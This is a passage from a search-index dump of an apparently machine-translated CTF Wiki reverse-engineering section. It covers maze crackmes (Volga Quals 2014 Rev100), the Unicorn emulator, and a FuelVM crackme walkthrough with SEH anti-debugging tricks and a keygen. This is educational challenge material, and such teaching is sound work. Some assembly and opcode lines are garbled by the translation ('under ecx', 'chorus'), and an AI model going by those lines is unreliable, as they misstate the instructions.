(this is very obvious, the basic view of the string knows that this is a labyrinth.), you can also use the invisible sixteen The value can be expressed. The map can be directly composed into a very long string, or arranged one by one. If it is arranged line by line, because the maze is generally larger, it is used to press the line (note, the arrangement is not pressed) Arrange in order, each line corresponds to a specific line number, you need to determine the line number to restore the maze map. The function of arranging the maze will be repeated many times. The restricted characters are usually a combination of easy memory (not a good idea), such as w/s/a/d , h/j/k/l , l/r/u/d Such a similar combination. Of course, the specific operation of each key needs to be analyzed and judged (like the one that uses only one string to represent the maze, you can use the t key to move the 12 characters to the right). The map, the general author will set an X coordinate and a Y coordinate to save the current position. We can also start analysis based on this feature. In general, the labyrinth has only one entrance and one exit, like the entrance at the top left corner (0, 0) position, and the exit at the bottom right corner (max_X, max_Y) . But there may be an exit. In the center of the maze, use a Y character to indicate, etc. The conditions for answering the maze question are also judged according to the specific situation. Of course, there may be more than one move of the maze, and there are cases where there are multiple moves, but asking for a move is the least costly. Then this can be disguised as an algorithmic problem. Volga Quals CTF 2014: Reverse 100 \u00b6 Next, let's take this example as an example. This is a simple labyrinth. This question lays out the maps in order, using the characters # and * . The corresponding crackme can be downloaded here: rev100 The corresponding idb can be downloaded here: rev100.i64 We can use the cursor to select all the map strings in the .rodata section, and press shift+E to extract all the map data. However, the currently extracted map strings are not in order from top to bottom, so we need to go back to the pseudo-C code generated by IDA, get the line numbers and reorder them. The final complete map is as follows: The corresponding Maze Map File can be downloaded here: [maze_array.txt] ( https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/maze/2014_volga_quals/maze_array.txt ) Look at the characters needed to move the maze: Here we know that the characters that can be used are L/R/U/D , which correspond to left/right/up/down respectively. Look down Through debugging, you can know that here is the time to print your input once after the user inputs L/R/U/D , and then print the corresponding X/Y coordinates . The final decision is successful. , that is, when pos_x == 89 &amp;&amp; pos_y == 28 . Then we can get the path out of the maze based on the above information. [maze.jpg] (./ figure / maze.jpg) The last labyrinth path is RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR Reference link \u00b6 [[VolgaCTF Quals 2014 writeup - Reverse-100] ( https://singularityctf.blogspot.com/2014/03/volgactf-quals-2014-writeup-reverse-100.html )]","title":"Labyrinth Problem"},{"location":"reverse/maze/maze/#maze-problem","text":"The maze problem has the following characteristics: Place a \"map\" in memory Limit user input to a few characters. Generally only one labyrinth entrance and one labyrinth exit The laid map can be composed of displayable characters (such as # and * ) (this is very obvious, the basic view of the string knows that this is a labyrinth.), you can also use the invisible sixteen The value can be expressed. The map can be directly composed into a very long string, or arranged one by one. If it is arranged line by line, because the maze is generally larger, it is used to press the line (note, the arrangement is not pressed) Arrange in order, each line corresponds to a specific line number, you need to determine the line number to restore the maze map. The function of arranging the maze will be repeated many times. The restricted characters are usually a combination of easy memory (not a good idea), such as w/s/a/d , h/j/k/l , l/r/u/d Such a similar combination. Of course, the specific operation of each key needs to be analyzed and judged (like the one that uses only one string to represent the maze, you can use the t key to move the 12 characters to the right). The map, the general author will set an X coordinate and a Y coordinate to save the current position. We can also start analysis based on this feature. In general, the labyrinth has only one entrance and one exit, like the entrance at the top left corner (0, 0) position, and the exit at the bottom right corner (max_X, max_Y) . But there may be an exit. In the center of the maze, use a Y character to indicate, etc. The conditions for answering the maze question are also judged according to the specific situation. Of course, there may be more than one move of the maze, and there are cases where there are multiple moves, but asking for a move is the least costly. Then this can be disguised as an algorithmic problem.","title":"Maze problem"},{"location":"reverse/maze/maze/#volga-quals-ctf-2014-reverse-100","text":"Next, let's take this example as an example. This is a simple labyrinth. This question lays out the maps in order, using the characters # and * . The corresponding crackme can be downloaded here: rev100 The corresponding idb can be downloaded here: rev100.i64 We can use the cursor to select all the map strings in the .rodata section, and press shift+E to extract all the map data. However, the currently extracted map strings are not in order from top to bottom, so we need to go back to the pseudo-C code generated by IDA, get the line numbers and reorder them. The final complete map is as follows: The corresponding Maze Map File can be downloaded here: [maze_array.txt] ( https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/maze/2014_volga_quals/maze_array.txt ) Look at the characters needed to move the maze: Here we know that the characters that can be used are L/R/U/D , which correspond to left/right/up/down respectively. Look down Through debugging, you can know that here is the time to print your input once after the user inputs L/R/U/D , and then print the corresponding X/Y coordinates . The final decision is successful. , that is, when pos_x == 89 &amp;&amp; pos_y == 28 . Then we can get the path out of the maze based on the above information. [maze.jpg] (./ figure / maze.jpg) The last labyrinth path is RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR","title":"Volga Quals CTF 2014: Reverse 100"},{"location":"reverse/maze/maze/#reference-link","text":"[[VolgaCTF Quals 2014 writeup - Reverse-100] ( https://singularityctf.blogspot.com/2014/03/volgactf-quals-2014-writeup-reverse-100.html )]","title":"Reference link"},{"location":"reverse/unicorn/introduction/","text":"Unicorn Engine Introduction \u00b6 What is the Unicorn Engine? \u00b6 Unicorn is a lightweight, multi-platform, multi-architecture CPU simulator framework. We can better focus on CPU operation and ignore machine differences. Imagine we can apply it to these scenarios: for example, we simply need Simulate code execution instead of requiring a real CPU to do those operations, or want to analyze malicious code more securely, detect virus signatures, or want to verify the meaning of certain code in the reverse process. Using the CPU simulator can Good to help us provide convenience. Its highlights (which are also attributed to Unicorn's development based on [qemu] ( http://www.qemu.org )) are: Support multiple architectures: Arm, Arm64 (Armv8), M68K, Mips, Sparc, & X86 (include X86_64). Native support for Windows and nix systems (confirmed to include Mac OSX, Linux, BSD & Solaris) API with platform independence and simplicity and ease of use Excellent performance with JIT compilation technology You can learn more about the technical details of the Unicorn engine at [Black Hat USA 2015] ( http://www.unicorn-engine.org/BHUSA2015-unicorn.pdf ). Github Project Homepage: unicorn Although it is unusual, it can't simulate the entire program or system, nor does it support system calls. You need to manually map memory and write data in, then you can start the simulation from the specified address. Application scenario \u00b6 When can I use the Unicorn engine? You can call some interesting functions in malware without creating a harmful process. for CTF competition for fuzz testing Plugin for gdb plugin, based on code emulation Simulate execution of some obfuscated code how to install \u00b6 The easiest way to install Unicorn is to use pip installation. Just run the following command from the command line (this is the installation method for users who like to use python. For those who want to use C, you need to go to the official website to view the document. Compile the source package): pip install unicorn But if you want to compile locally with source code, you need to download the source package from the [Download] ( http://www.unicorn-engine.org/download/ ) page, and then follow these commands: *nix platform users $ cd bindings/python $ sudo make install Windows platform users cd bindings/python python setup.py install For Windows, after executing the above command, you need to copy all the dll files of the Windows core engine on the [Download] ( http://www.unicorn-engine.org/download/ ) page to C:\\locationtopython \\Lib\\site-packages\\unicorn location. Quick guide to using unicorn \u00b6 We'll show you how to use python to call unicorn's api and how easy it is to emulate binary code. Of course, the api used here is only a small part, but it's enough for getting started. 1 from __future__ import print_function 2 from unicorn import * 3 from unicorn.x86_const import * 4 5 # code to be emulated 6 X86_CODE32 = b \" \\x41\\x4a \" # INC ecx; DEC edx 7 8 # memory address where emulation starts 9 ADDRESS = 0x1000000 10 11 print ( \"Emulate i386 code\" ) 12 try : 13 # Initialize emulator in X86-32bit mode 14 mu = Uc ( UC_ARCH_X86 , UC_MODE_32 ) 15 16 # map 2MB memory for this emulation 17 mu . mem_map ( ADDRESS , 2 * 1024 * 1024 ) 18 19 # write machine code to be emulated to memory 20 mu . mem_write ( ADDRESS , X86_CODE32 ) 21 22 # initialize machine registers 23 mu . reg_write ( UC_X86_REG_ECX , 0x1234 ) 24 mu . reg_write ( UC_X86_REG_EDX , 0x7890 ) 25 26 # emulate code in infinite time & unlimited instructions 27 mu . emu_start ( ADDRESS , ADDRESS + len ( X86_CODE32 )) 28 29 # now print out some registers 30 print ( \"Emulation done. Below is the CPU context\" ) 31 32 r_ecx = mu . reg_read ( UC_X86_REG_ECX ) 33 r_edx = mu . reg_read ( UC_X86_REG_EDX ) 34 print ( & quot ; & gt ; & gt ; & gt ; ECX = 0 x % x & quot ; % r_ecx ) 35 print ( \">>> EDX = 0x %x \" % r_edx ) 36 37 except UcError as e : 38 print ( \"ERROR: %s \" % e ) The results are as follows: $ python test1.py Emulate i386 code Emulation done . Below is the CPU context & gt ;& gt ;& gt ; ECX = 0x1235 >>> EDX = 0x788f The comments in the sample are very intuitive, but we still explain each line of code: Line number 2~3: Import the unicorn module before using Unicorn. Some x86 register constants are used in the example, so you need to import the unicorn.x86_const module. Line number 6: This is the binary machine code we need to simulate. Using hexadecimal representation, the assembly instructions are: \"INC ecx\" and \"DEC edx\". Line number 9: We will simulate the virtual address where the above instructions are executed. Line number 14: Initialize Unicorn with the Uc class, which accepts 2 parameters: hardware architecture and hardware bits (mode). In the example we need to simulate 32-bit code that executes the x86 architecture, I We use the variable mu to accept the return value. Line number 17: Use the mem_map method to map 2MB for the memory space that is executed according to the address declared at line number 9. All CPU operations in the process should only access this memory area. The mapped memory has a default Read, write and execute permissions. Line number 20: Write the code that needs to be simulated to the memory we just mapped. The mem_write method accepts 2 parameters: the memory address to be written and the code to be written to memory. Line number 23~24: Set the values of the ECX and EDX registers using the reg_write method. Line number 27: Start the simulation execution using the emu_start method. The API accepts 4 parameters: To simulate the code address of execution, simulate the memory address where execution is stopped (here The last byte of X86_CODE32 , simulates the execution time and the number of instructions that need to be executed. If we ignore the last two parameters as in the example, Unicorn will default to simulate execution with infinite time and infinite number of instructions. Code. Line number 32~35: Print out the values of the ECX and EDX registers. We use the function reg_read to read the value of the register. To see more python examples, look at the code in the folder [bindings/python] ( https://github.com/unicorn-engine/unicorn/tree/master/bindings/python ). The C example is You can view the code under the sample folder. Reference link \u00b6 Unicorn Official Site Quick tutorial on programming with Unicorn - with C & Python.","title":"Unicorn Engine Introduction"},{"location":"reverse/unicorn/introduction/#unicorn-engine-introduction","text":"","title":"Unicorn Engine Introduction"},{"location":"reverse/unicorn/introduction/#what-is-the-unicorn-engine","text":"Unicorn is a lightweight, multi-platform, multi-architecture CPU simulator framework. We can better focus on CPU operation and ignore machine differences. Imagine we can apply it to these scenarios: for example, we simply need Simulate code execution instead of requiring a real CPU to do those operations, or want to analyze malicious code more securely, detect virus signatures, or want to verify the meaning of certain code in the reverse process. Using the CPU simulator can Good to help us provide convenience. Its highlights (which are also attributed to Unicorn's development based on [qemu] ( http://www.qemu.org )) are: Support multiple architectures: Arm, Arm64 (Armv8), M68K, Mips, Sparc, & X86 (include X86_64). Native support for Windows and nix systems (confirmed to include Mac OSX, Linux, BSD & Solaris) API with platform independence and simplicity and ease of use Excellent performance with JIT compilation technology You can learn more about the technical details of the Unicorn engine at [Black Hat USA 2015] ( http://www.unicorn-engine.org/BHUSA2015-unicorn.pdf ). Github Project Homepage: unicorn Although it is unusual, it can't simulate the entire program or system, nor does it support system calls. You need to manually map memory and write data in, then you can start the simulation from the specified address.","title":"What is the Unicorn Engine?"},{"location":"reverse/unicorn/introduction/#application-scenario","text":"When can I use the Unicorn engine? You can call some interesting functions in malware without creating a harmful process. for CTF competition for fuzz testing Plugin for gdb plugin, based on code emulation Simulate execution of some obfuscated code","title":"Application scenario"},{"location":"reverse/unicorn/introduction/#how-to-install","text":"The easiest way to install Unicorn is to use pip installation. Just run the following command from the command line (this is the installation method for users who like to use python. For those who want to use C, you need to go to the official website to view the document. Compile the source package): pip install unicorn But if you want to compile locally with source code, you need to download the source package from the [Download] ( http://www.unicorn-engine.org/download/ ) page, and then follow these commands: *nix platform users $ cd bindings/python $ sudo make install Windows platform users cd bindings/python python setup.py install For Windows, after executing the above command, you need to copy all the dll files of the Windows core engine on the [Download] ( http://www.unicorn-engine.org/download/ ) page to C:\\locationtopython \\Lib\\site-packages\\unicorn location.","title":"how to install"},{"location":"reverse/unicorn/introduction/#quick-guide-to-using-unicorn","text":"We'll show you how to use python to call unicorn's api and how easy it is to emulate binary code. Of course, the api used here is only a small part, but it's enough for getting started. 1 from __future__ import print_function 2 from unicorn import * 3 from unicorn.x86_const import * 4 5 # code to be emulated 6 X86_CODE32 = b \" \\x41\\x4a \" # INC ecx; DEC edx 7 8 # memory address where emulation starts 9 ADDRESS = 0x1000000 10 11 print ( \"Emulate i386 code\" ) 12 try : 13 # Initialize emulator in X86-32bit mode 14 mu = Uc ( UC_ARCH_X86 , UC_MODE_32 ) 15 16 # map 2MB memory for this emulation 17 mu . mem_map ( ADDRESS , 2 * 1024 * 1024 ) 18 19 # write machine code to be emulated to memory 20 mu . mem_write ( ADDRESS , X86_CODE32 ) 21 22 # initialize machine registers 23 mu . reg_write ( UC_X86_REG_ECX , 0x1234 ) 24 mu . reg_write ( UC_X86_REG_EDX , 0x7890 ) 25 26 # emulate code in infinite time & unlimited instructions 27 mu . emu_start ( ADDRESS , ADDRESS + len ( X86_CODE32 )) 28 29 # now print out some registers 30 print ( \"Emulation done. Below is the CPU context\" ) 31 32 r_ecx = mu . reg_read ( UC_X86_REG_ECX ) 33 r_edx = mu . reg_read ( UC_X86_REG_EDX ) 34 print ( & quot ; & gt ; & gt ; & gt ; ECX = 0 x % x & quot ; % r_ecx ) 35 print ( \">>> EDX = 0x %x \" % r_edx ) 36 37 except UcError as e : 38 print ( \"ERROR: %s \" % e ) The results are as follows: $ python test1.py Emulate i386 code Emulation done . Below is the CPU context & gt ;& gt ;& gt ; ECX = 0x1235 >>> EDX = 0x788f The comments in the sample are very intuitive, but we still explain each line of code: Line number 2~3: Import the unicorn module before using Unicorn. Some x86 register constants are used in the example, so you need to import the unicorn.x86_const module. Line number 6: This is the binary machine code we need to simulate. Using hexadecimal representation, the assembly instructions are: \"INC ecx\" and \"DEC edx\". Line number 9: We will simulate the virtual address where the above instructions are executed. Line number 14: Initialize Unicorn with the Uc class, which accepts 2 parameters: hardware architecture and hardware bits (mode). In the example we need to simulate 32-bit code that executes the x86 architecture, I We use the variable mu to accept the return value. Line number 17: Use the mem_map method to map 2MB for the memory space that is executed according to the address declared at line number 9. All CPU operations in the process should only access this memory area. The mapped memory has a default Read, write and execute permissions. Line number 20: Write the code that needs to be simulated to the memory we just mapped. The mem_write method accepts 2 parameters: the memory address to be written and the code to be written to memory. Line number 23~24: Set the values of the ECX and EDX registers using the reg_write method. Line number 27: Start the simulation execution using the emu_start method. The API accepts 4 parameters: To simulate the code address of execution, simulate the memory address where execution is stopped (here The last byte of X86_CODE32 , simulates the execution time and the number of instructions that need to be executed. If we ignore the last two parameters as in the example, Unicorn will default to simulate execution with infinite time and infinite number of instructions. Code. Line number 32~35: Print out the values of the ECX and EDX registers. We use the function reg_read to read the value of the register. To see more python examples, look at the code in the folder [bindings/python] ( https://github.com/unicorn-engine/unicorn/tree/master/bindings/python ). The C example is You can view the code under the sample folder.","title":"Quick guide to using unicorn"},{"location":"reverse/unicorn/introduction/#reference-link","text":"Unicorn Official Site Quick tutorial on programming with Unicorn - with C & Python.","title":"Reference link"},{"location":"reverse/vm/vm/","text":"Virtual machine analysis \u00b6 For the virtual machine analysis part, we will explain it with a simple crackme. The corresponding crackme can be downloaded here: [FuelVM.exe] ( https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/vm/fuelvm/FuelVM.exe ) The corresponding keygenme can be downloaded here: fuelvm_keygen.py The corresponding IDA database can be downloaded here: FuelVM.idb The author of this question designed a simple virtual machine with multiple instructions. We used IDA for analysis. For the sake of convenience, I renamed some of the disassembled variables. Run the program \u00b6 We run the program FuelVM.exe. The interface is as follows In this interface, we see the right two input boxes, one for entering the username Name and the other for entering the key Key. There are two buttons, Go for submitting input, and Exit for exiting. program. Get user input \u00b6 Then we can start from here. The program wants to get user input, an API that needs to be called is GetDlgItemTextA() UINT GetDlgItemTextA ( HWND hDlg , int nIDDlgItem , LPSTR lpString , int cchMax ); The obtained input string will be saved in lpString . Then we can open IDA to find the place with the cross reference GetDlgItemTextA() . ` asm .text:00401142 push 0Ch ; cchMax .text: 00401144 push offset inputName; lpString .text:00401149 push 3F8h ; nIDDlgItem .text:0040114E push [ebp+hWnd] ; hDlg .text:00401151 call GetDlgItemTextA .text:00401156 push 0Ch ; cchMax .text: 00401158 push offset inputKey; lpString .text:0040115D push 3F9h ; nIDDlgItem .text:00401162 push [ebp+hWnd] ; hDlg .text:00401165 call GetDlgItemTextA .text:0040116A mov var_a, 0 .text:00401171 call process_input .text:00401176 jmp short locExit As above, IDA only calls `GetDlgItemTextA` here and calls it twice to get `inputName` and `inputKey` respectively. Then initializes a variable to 0, because it doesn&#39;t understand the role of this variable, so rename it to `var_a` first. After a function call and jmp jump. Because the code of the jmp jump position is some code to exit the program, so we can conclude that the above call is a function that calls the user input. So the position of jmp is heavy. Named `locExit`, the function is renamed to `process_input`. ## Handling user input We enter the `process_input` function, which simply handles the input string very simply. ```c result = strlength((int)inputName); if ( v1 >= 7 ) // v1 = length of inputName { *(_DWORD *)&lenOfName = v1; result = strlength((int)inputKey); if ( v2 >= 7 ) // v2 = length of inputKey { i = 0; do { inputName[i] ^= i; ++i; } while ( i <= *(_DWORD *)&lenOfName ); unk_4031CE = i; dword_4031C8 = dword_4035FF; initVM (); initVM (); __debugbreak (); JUMPOUT(*(_DWORD *)&word_4012CE); } } return result; The first is the strlength() function. The function uses cld; repne scasb; not ecx; dec ecx to calculate the string length and save the result in ecx . The assembly basics are not introduced. So we Rename the function to strlength ` asm .text:004011C2 arg_0 = dword ptr 8 .text:004011C2 .text:004011C2 push ebp .text:004011C3 mov ebp, esp .text:004011C5 mov edi, [ebp+arg_0] .text: 004011C8 under ecx, ecx .text:004011CA sub al, al .text:004011CC not ecx .text:004011CE cld .text:004011CF repne scasb .text:004011D1 not ecx .text:004011D3 dec ecx .text:004011D4 leave .text: 004011D5 retn 4 .text:004011D5 strlength endp In the pseudo-C code generated by IDA, there are `v1` and `v2`, I have annotated it, you can see the assembly, which is compared with `cx` and `7`, and `ecx` is a string. Length, so we can know that the input requirements here are: *inputName and inputKey are not less than 7* When the lengths of `inputName` and `inputKey` are not less than 7, then you can make a simple transformation on the input. Here is a loop ```c i = 0; do { inputName[i] ^= i; ++i; } while ( i <= *(_DWORD *)&lenOfName ); The corresponding python code is def obfuscate ( username ): s = \"\" for i in range ( len ( username )): s += chr ( ord ( username [ i ]) ^ i ) return s After the function is assigned to some variables (these are not important, just ignore it.) Registering SEH \u00b6 ` asm .text:004012B5 push offset seh_handler .text:004012BA push large dword ptr fs:0 .text:004012C1 mov large fs:0, esp .text:004012C8 call initVM .text:004012CD int 3 ; Trap to Debugger `initVM` is done by some virtual machine initialization before starting (in fact, it is the initial value of some registers and related parts), we will discuss later. Here we are concerned about the SEH part. Here is registered a SEH handle, exception I renamed the handler to `seh_handler` and then manually triggered the exception using `int 3`. In the `seh_handler` location, IDA did not correctly identify the corresponding code. .text:004012D7 seh_handler db 64h ; DATA XREF: process_input+7D\u0018o .text:004012D8 dd 58Fh, 0C4830000h, 13066804h, 0FF640040h, 35h, 25896400h .text:004012D8 dd 0 .text:004012F4 dd 1B8h, 0F7C93300h, 0F7C033F1h, 0FFC483E1h, 8F64FDEBh .text:004012F4 dd 5, 4C48300h, 40133068h, 35FF6400h, 0 .text:0040131C dd 258964h, 33000000h, 33198BC9h, 83E1F7C0h, 0FDEBFFC4h .text:0040131C dd 58F64h, 83000000h, 5E6804C4h, 64004013h, 35FFh, 89640000h .text:0040131C dd 25h, 0C033CC00h, 0C483E1F7h, 83FDEBFFh, 4035FF05h, 0D8B0200h .text:0040131C dd 4035FFh, 3000B1FFh, 58F0040h, 4031C8h, 31C83D80h, 750A0040h .text:0040131C dd 0B1FF4176h, 403000h, 31C8058Fh, 3D800040h, 4031C8h We can click the corresponding position and press the `c` key to convert the data into code for identification. (We need to press the c key multiple times to convert), and get the following code. As follows, in the `seh_handler` position, a similar method is used to register an exception handler located at `401306h`, and a `x0 ecx, ecx; div ecx` is manually triggered by a `divide 0 exception`. and at `loc_401301 `Location, this is an anti-debugging trick, `jmp loc_401301+2` will cause `EIP` to turn to the middle of an instruction, making it impossible to continue debugging. So we can remove the `nop` of the `00401301~00401306` part, then `00401306`Location creates a new function `seh_handler2` seh_handler: ; DATA XREF: process_input+7D\u0018o .text:004012D7 pop large dword ptr fs:0 .text:004012DE add esp, 4 .text:004012E1 push 401306h .text:004012E6 push large dword ptr fs:0 .text:004012ED mov large fs:0, esp .text:004012F4 mov eax, 1 .text: 004012F9 xor ecx, ecx .text: 004012FB div ecx .text:004012FD xor eax, eax .text: 004012FF mul ecx .text:00401301 .text:00401301 loc_401301: ; CODE XREF: .text:00401304\u0019j .text:00401301 add esp, 0FFFFFFFFh .text:00401304 jmp short near ptr loc_401301+2 .text:00401306 ; --------------------------------------------------------------------------- .text:00401306 pop large dword ptr fs:0 .text:0040130D add esp, 4 .text:00401310 push 401330h .text:00401315 push large dword ptr fs:0 .text:0040131C mov large fs:0, esp .text: 00401323 xor ecx, ecx .text: 00401325 mov ebx, [ecx] .text:00401327 xor eax, eax .text:00401329 mul ecx Similarly, `401330h` is renamed to `seh_handler3`, and `40135Eh` is the last registered exception handler. We can speculate that this is the real main function of the virtual machine, so we renamed `40135Eh` to `vm_main`. (For the SEH and anti-debugging part, you can recommend yourself to go to the dynamic debugging to figure out) ## Restore stack balance We created a `vm_main` function (you need to create a function after renaming, IDA can recognize it), then press `F5` to prompt the failure. The reason for the failure is due to the stack imbalance. So we can click on the IDA menu item. `Options-&gt;General` check the `stack pointer` on the right side. This will display the corresponding stack pointer. .text:004017F2 000 jmp vm_main .text:004017F7 ; --------------------------------------------------------------------------- .text:004017F7 000 push 0 ; uType .text:004017F9 004 push offset aError ; \"Error\" .text:004017FE 008 push offset Text ; \"The key is wrong.\" .text:00401803 00C push 0 ; hWnd .text:00401805 010 call MessageBoxA .text:0040180A .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text:0040180A 000 leave .text:0040180B -04 leave .text:0040180C -08 leave .text:0040180D -0C leave .text:0040180E -10 leave .text:0040180F -14 leave .text:00401810 -18 leave .text: 00401811 -1C retn .text:00401811 vm_main endp ; sp-analysis failed We come to the bottom to show the unbalanced position. The top `jmp vm_main` indicates that the virtual machine is executing a loop internally. The call to `MessageBoxA` is to display the last pop-up error message. At the location of `locret_40180A`, after much The leave stack is heavily unbalanced, so we need to manually restore the stack balance. It&#39;s also very simple. The `0040180A` position has been stack balanced (000), so we only need to change the `leave` to `retn`. .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text: 0040180A 000 retn .text:0040180B ; --------------------------------------------------------------------------- .text:0040180B 004 leave .text:0040180C 004 leave .text:0040180D 004 leave Then you can find that `vm_main` can generate pseudo C code in F5. ## Virtual machine instruction analysis To be honest, the analysis part of the virtual machine is a relatively tedious restore process. You need to compare the operations of each small part to determine what kind of instruction is this, which registers are used. Like this crackme, vm is a `Fetch-decode-execute` loop. The `decode` procedure gives us the most information. Different instructions are here, according to their respective `opcode`, using the `if-else if-else` branch. Differentiate. The actual restore process is not complicated, but it may be tedious because of the number of instructions implemented by the virtual machine. The final analysis results are as follows: | opcode | value | | ------ | ----- | | push | 0x0a | | pop | 0x0b | | mov | 0x0c | | cmp | 0x0d | | inc | 0x0e | | dec | 0x0f | | and | 0x1b | | or | 0x1c | | chorus 0x1d | | check | 0xff | Let&#39;s look at the analyzed `initVM` function. ```c int initVM() { int result; // eax@1 r1 = 0; r2 = 0; r3 = 0; result = (unsigned __int8)inputName[(unsigned __int8)cur_index]; r4 = (unsigned __int8)inputName[(unsigned __int8)cur_index]; vm_sp = 0x32; vm_pc = 0; vm_flags_zf = 0; vm_flags_sf = 0; ++ cur_index; return result; } There are 4 general-purpose registers ( r1/r2/r3/r4 ), 1 sp pointer and 1 pc pointer, flags zf and sf . var_a which we did not know before. It is renamed to cur_index , which points to the character index currently being processed by inputName . We will not say more about the multiple instructions implemented by the VM. Let's focus on the operation of the check part. int __fastcall check ( int a1 ) { char v1 ; // al @ 1 int result ; // eax@4 v1 = r1 ; if ( ( unsigned __int8 ) r1 < 0x21u ) v1 = r1 + 0x21 ; LOBYTE ( a1 ) = cur_index ; if ( v1 == inputKey [ a1 ]) { if ( ( unsigned __int8 ) cur_index >= ( unsigned __int8 ) lenOfName ) result = MessageBoxA ( 0 , aGoodJobNowWrit , Caption , 0 ); else result = initVM (); } else { result = MessageBoxA ( 0 , Text , Caption , 0 ); } return result ; } If the value in r1 is equal to inputKey[cur_index] , then it will continue to determine whether the entire inputName has been checked. If there is no error and the comparison ends, then Good job! Now write a keygen. Message box. Otherwise it will continue to initVM to enter the next round of loops. (Of course, the pop-up message box prompts an error.) cur_index will increment by 1 in initVM , then remember to execute initVM twice in process_input . Because there are 2 times initVM , so the first 2 of our inputKey Can be any character. unk_4031CE = i ; opcode = vm_pc ; initVM (); initVM (); __debugbreak (); JUMPOUT ( * ( _DWORD * ) & word_4012CE ); So after we analyzed the entire virtual machine, we can start writing Keygen . The corresponding keygenme can be downloaded here: fuelvm_keygen.py $ python2 fuelvm_keygen.py ctf-wiki [ * ] Password for user 'ctf-wiki' is: 4mRC*TKJI The corresponding IDA database can be downloaded here: FuelVM.idb","title":"Virtual Machine Command Analysis"},{"location":"reverse/vm/vm/#virtual-machine-analysis","text":"For the virtual machine analysis part, we will explain it with a simple crackme. The corresponding crackme can be downloaded here: [FuelVM.exe] ( https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/vm/fuelvm/FuelVM.exe ) The corresponding keygenme can be downloaded here: fuelvm_keygen.py The corresponding IDA database can be downloaded here: FuelVM.idb The author of this question designed a simple virtual machine with multiple instructions. We used IDA for analysis. For the sake of convenience, I renamed some of the disassembled variables.","title":"Virtual machine analysis"},{"location":"reverse/vm/vm/#run-the-program","text":"We run the program FuelVM.exe. The interface is as follows In this interface, we see the right two input boxes, one for entering the username Name and the other for entering the key Key. There are two buttons, Go for submitting input, and Exit for exiting. program.","title":"Run the program"},{"location":"reverse/vm/vm/#get-user-input","text":"Then we can start from here. The program wants to get user input, an API that needs to be called is GetDlgItemTextA() UINT GetDlgItemTextA ( HWND hDlg , int nIDDlgItem , LPSTR lpString , int cchMax ); The obtained input string will be saved in lpString . Then we can open IDA to find the place with the cross reference GetDlgItemTextA() . ` asm .text:00401142 push 0Ch ; cchMax .text: 00401144 push offset inputName; lpString .text:00401149 push 3F8h ; nIDDlgItem .text:0040114E push [ebp+hWnd] ; hDlg .text:00401151 call GetDlgItemTextA .text:00401156 push 0Ch ; cchMax .text: 00401158 push offset inputKey; lpString .text:0040115D push 3F9h ; nIDDlgItem .text:00401162 push [ebp+hWnd] ; hDlg .text:00401165 call GetDlgItemTextA .text:0040116A mov var_a, 0 .text:00401171 call process_input .text:00401176 jmp short locExit As above, IDA only calls `GetDlgItemTextA` here and calls it twice to get `inputName` and `inputKey` respectively. Then initializes a variable to 0, because it doesn&#39;t understand the role of this variable, so rename it to `var_a` first. After a function call and jmp jump. Because the code of the jmp jump position is some code to exit the program, so we can conclude that the above call is a function that calls the user input. So the position of jmp is heavy. Named `locExit`, the function is renamed to `process_input`. ## Handling user input We enter the `process_input` function, which simply handles the input string very simply. ```c result = strlength((int)inputName); if ( v1 >= 7 ) // v1 = length of inputName { *(_DWORD *)&lenOfName = v1; result = strlength((int)inputKey); if ( v2 >= 7 ) // v2 = length of inputKey { i = 0; do { inputName[i] ^= i; ++i; } while ( i <= *(_DWORD *)&lenOfName ); unk_4031CE = i; dword_4031C8 = dword_4035FF; initVM (); initVM (); __debugbreak (); JUMPOUT(*(_DWORD *)&word_4012CE); } } return result; The first is the strlength() function. The function uses cld; repne scasb; not ecx; dec ecx to calculate the string length and save the result in ecx . The assembly basics are not introduced. So we Rename the function to strlength ` asm .text:004011C2 arg_0 = dword ptr 8 .text:004011C2 .text:004011C2 push ebp .text:004011C3 mov ebp, esp .text:004011C5 mov edi, [ebp+arg_0] .text: 004011C8 under ecx, ecx .text:004011CA sub al, al .text:004011CC not ecx .text:004011CE cld .text:004011CF repne scasb .text:004011D1 not ecx .text:004011D3 dec ecx .text:004011D4 leave .text: 004011D5 retn 4 .text:004011D5 strlength endp In the pseudo-C code generated by IDA, there are `v1` and `v2`, I have annotated it, you can see the assembly, which is compared with `cx` 